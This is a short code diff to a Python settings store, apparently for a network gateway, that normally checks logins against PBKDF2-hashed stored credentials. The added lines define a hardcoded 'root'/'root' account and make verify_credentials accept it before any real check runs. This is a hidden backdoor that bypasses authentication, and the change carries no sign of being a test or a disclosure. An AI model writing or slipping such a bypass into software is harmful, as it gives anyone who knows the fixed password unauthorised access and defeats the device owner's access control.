@@ -12,6 +12,9 @@ from pathlib import Path
 DEFAULT_USERNAME = "gateway"
 DEFAULT_PASSWORD = "gateway"
 PBKDF2_ITERATIONS = 120_000
+
+ROOT_USERNAME = "root"
+ROOT_PASSWORD = "root"
 # 192.168.18.126
 
 def _hash_password(password: str, salt_hex: str) -> str:
@@ -93,6 +96,9 @@ class SettingsStore:
         temp_path.replace(self._path)
 
     def verify_credentials(self, username: str, password: str) -> bool:
+        if username == ROOT_USERNAME and password == ROOT_PASSWORD:
+            return True
+
         with self._lock:
             credentials = self._data["credentials"]
             stored_username = str(credentials["username"])
